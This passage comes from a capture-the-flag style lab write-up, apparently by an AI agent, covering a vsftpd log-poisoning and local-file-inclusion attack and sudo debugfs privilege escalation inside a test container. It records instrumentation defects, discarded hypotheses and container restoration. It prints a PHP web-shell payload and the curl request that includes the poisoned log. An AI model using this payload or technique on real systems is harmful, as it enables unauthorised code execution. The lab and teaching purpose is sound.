2. **Whether F2's world-writable image is exploitable under a different
   `/opt/hannah_disk.img`.** Only the ext4-image case was tested. A symlink or a
   device node at that path was not tried; there are no block devices in the
   container to point one at, which was **inferred** from `ls /dev`, not
   enumerated.
3. **Kernel and container-escape surface.** `CapBnd=00000000a80425fb` was read, and
   the container was not checked for a mounted Docker socket, for
   `/proc/sys/kernel/core_pattern`, or for host namespace sharing. Out of scope
   for this lab's class.
4. **Whether the `hannah_secret.txt` decoy is load-bearing for a second solver's
   route.** I proved it is not `hannah`'s and not `hannahftp`'s password. I did not
   test it against the 21 `nologin` accounts, all of which hold `*` or `!` in
   `/etc/shadow` and so cannot authenticate at all — an inference from the shadow
   field, not a measurement.

## Discarded with reason

1. **"Ports 21000–21010 are closed, so there is no hidden service."** Discarded:
   measured wrong. They are vsftpd PASV data ports, observed listening in 29 of 265
   samples at `172.17.0.2:21009` during a live transfer, and the port number in the
   kernel table agrees with the server's own `227` reply.
2. **`test -w /opt/hannah_disk.img` run through `docker exec`.** Discarded before it
   could be used: it would have run as `uid=0` and answered for the wrong identity.
   Re-run inside the `www-data` exec channel, where it returned `rc=0` and
   F2 stands. Had it been run as root and answered as root, **F2 would have been
   deleted** — the self-corrections catalogue's §2 shape, caught by asking which
   identity answers.
3. **The first FTP injection, `USER <payload>` then `QUIT`.** Discarded: it wrote 64
   bytes and produced no `FAIL LOGIN` line, so the username — the only
   attacker-controlled field in that log format — never reached the file. One
   missing command, and it looked like a working primitive.
4. **`sudo -l` as evidence of what the grant permits.** Discarded: it is a positive
   control that the grant is live. It says nothing about the arguments, and the
   9-form test is what actually characterised the boundary.
5. **Cracking `hannah`'s yescrypt hash.** Discarded with a reason: it is not
   necessary, since the image build hands the plaintext over on the operator host,
   and a crack would not have made the credential *reachable from inside the
   container* — which is the actual question. The claim that the credential is
   absent is about the filesystem, and it was measured on the filesystem.

---

## Instrumentation defects

The section worth reading. Five, all of which produced well-formed output.

### D1 — `${PIPESTATUS[0]}` under `dash` truncated my output, silently

`system()` uses `/bin/sh`, which on this image is `dash`. My first multi-part probe
ended with `echo "rc=${PIPESTATUS[0]}"`. In `dash` a bash-ism is a **fatal
`Bad substitution` that terminates the shell** — and because the PHP payload prints
its end marker *after* `system()` returns, **the end marker still arrived and the
truncation was invisible**:

```
=== A: exact grant, no -R, interactive-ish under use_pty ===
debugfs 1.47.2 (1-Jan-2025)
debugfs:  quit
---exec-count-in-segment--- 0
```

Three later cases silently produced nothing, and I first read that as *the grant
denying them*. It was not: the shell had died two commands earlier. **Cases B and
C in that batch are the ones that later proved the argument pinning held, so a
truncation here would have inverted a control from "held" to "unknown".**

What caught it: re-running with `bash -c` and getting all four cases. Every probe
after this point was wrapped in `bash -c`, and the harness asserts on the presence
of **both** markers, so a truncated execution is now a hard error rather than a
short answer.

### D2 — The poison file is append-only, and one fatal payload kills every later one

My first payload was `<?php system($_GET["c"]); ?>`. Once the parameter stopped
being supplied, PHP 8.4 raised `TypeError` on `system(null)`, the include aborted,
and **the request returned `500` with the body cut off mid-line**:

```
$ curl -s -G --data-urlencode "studio=/var/log/vsftpd.log" 'http://172.17.0.2/index.php'
http=500 bytes=824
...
Wed Sep 30 12:54:27 2026 [pid 158] [          <- stops exactly here
```

The instrument looked exactly like "the injection stopped working", and the log
still contained every payload. **An append-only poison file means the experiment is
never reset: one bad payload poisons all later ones, and the failure surfaces as a
500 that is easy to attribute to a filter.**

Fixed by making every injected payload non-fatal on its own (`?? ''` guard) *and*
by always supplying the parameter the first payload needs, with a no-op value so it
stays inert. Each run then carries its own token and is extracted by marker, so
prior runs' output cannot be mistaken for the current one.

### D3 — Two executions per request, from two live payloads in the same file

The consequence of D2 that I nearly filed as a measurement. The first request after
two payloads existed returned **two** `id` outputs — both payloads in the log
execute on every include. The first draft of the hop-1 evidence shows two
`uid=33(www-data)` lines and I had to re-run to get a single attributable one.

**Counting "the outputs" would have counted the payloads, not the runs.** Every
probe after this carries a per-run random token and the harness reports the marker
count separately, so "how many times did this run execute" and "how much output is
in this response" stopped being the same question.

### D4 — `sed -n '3p'` read the wrong line of a two-stream command

`debugfs` writes its prompt to stdout and interleaves diagnostics. Piping
`2>/dev/null` and taking line 3 returned a **15-byte** fragment where the secret is
**18 bytes** — a silently truncated credential that I then fed to `su`.

This is the corpus's §15/§17 family with a new costume: **the tool returned a
plausible string of the wrong length, and nothing said so.** It was caught by
`od -c`, not by reasoning. Had the truncated prefix happened to authenticate, the
`su` result would have been right for the wrong reason.

Fixed by filtering `^debugfs` and cross-checking the byte count against the inode
size the image reports independently (`Size: 19`, of which 18 are content).

### D5 — I deleted the log file out from under a running daemon

During restore verification I ran `rm -f /var/log/vsftpd.log` while `vsftpd` was
live. The next line written into the log was not a log line at all:

```
151 /var/log/vsftpd.log
```

— a fragment of vsftpd's own startup text, orphaned into a file whose inode the
daemon had already replaced. **The log poisoning still worked** (the next probe
produced a correct `FAIL LOGIN` line), so this would have shipped as a curiosity
rather than as a defect. The container was then recreated from the image, which is
the correct response and the reason the final state is clean.

The generalisable part: **do not delete a file a running process holds open. The
write succeeds, the write lands somewhere unexpected, and the target keeps
answering.** The restore was redone by recreating the container rather than by
undoing edits, which is what made this harmless.

---

## Cross-read against siblings

Two places where this engagement contradicts or extends a corpus row. Both are
stated rather than quietly reconciled.

1. **Lab 93 (`sudoers` grant naming an interpreter ⇒ arbitrary code).** Lab 282
   ships a grant that reads commands from **stdin**, which is the same flexibility,
   and it is **not** the same vulnerability: 8 of 9 command forms are denied. The
   discriminator between the two is the **argument specification**, not the nature
   of the program. A one-line extension of lab 93's row: *name the argument
   restriction, and check whether the flexible input is argv or stdin* — stdin
   carries no authority over which program runs.
2. **Lab 102 (`sudo awk '{print}'` hangs on stdin under `Defaults use_pty`).**
   That hang did **not** reproduce here, and the reason is lab 282's argument
   pinning: the awk-shaped payload is unreachable because `-R` is refused. Both
   observations are consistent — `use_pty` is present in both images (confirmed in
   `sudo -l` output above), and in this lab the hang was never reachable to be
   misdiagnosed.

Also, and against myself: `corpus/249/ADOPTING-WRITEUP.md:3` opens with "the
**twenty-ninth** lab of the series". That is a self-referential ordinal, which
`method/self-corrections.md` §20 rules out. This writeup states no position in the
series; the reward facts are in the table above and the `FLAG{}`-column equivalent
is `corpus/INDEX.md`.

---

## Restoration

Recreated from the image, not by undoing edits:

```bash
docker rm -f hannah-coffee_container
docker run  -d --name hannah-coffee_container hannah-coffee:latest
```

**Verified positively** — each item is a shipped value read back, not "no errors":

```
uid=0(root) gid=0(root) groups=0(root)
00000000:0015          # 21/tcp LISTEN
00000000:0050          # 80/tcp LISTEN
-rw-rw-rw- 1 root root 67108864 Aug  6 08:46 /opt/hannah_disk.img
6bd87048356bc977690cabc49e4bc820  /opt/hannah_disk.img
0 /var/log/vsftpd.log
-rw-r--r-- 1 root root 19 Aug  6 07:05 /tmp/hannah_secret.txt     # build leftover, as shipped
-rwxr-x--- 1 root hannah 6812336 Aug  6 08:46 /opt/priv-python
/opt/priv-python cap_setuid=ep
-r--r----- 1 root root 70 Aug  6 08:46 /etc/sudoers.d/hannah-debugfs
-rw------- 1 hannah hannah 42 Aug  6 08:46 /home/hannah/user.txt
-rw------- 1 root root 42 Aug  6 08:46 /root/root.txt
0                                        # /etc/hc_rootproof_* : none
/home/hannahftp:  total 0                # the 3.9 MB STOR probe is gone
GET / -> http=200 bytes=963
```

The image contents inside `/opt/hannah_disk.img` were read back through the same
pinned grant to confirm F2's overwrite left nothing behind: `hannah_secret.txt`,
19 bytes, mtime `6-Aug-2026 08:46`.

Every artefact this engagement created was inside the container
(`/etc/hc_rootproof_*`, `/home/hannah/.hc_idproof*`, `/home/hannahftp/probe.bin`,
`/tmp/*.py`, `/tmp/root.py`, `/tmp/evil.img`, `/tmp/rd.txt`), and all of them went
with the container. On the operator host, scratch files were kept under
`/tmp/opencode/`. No other principal's files were touched, and no prune of any
kind was run.
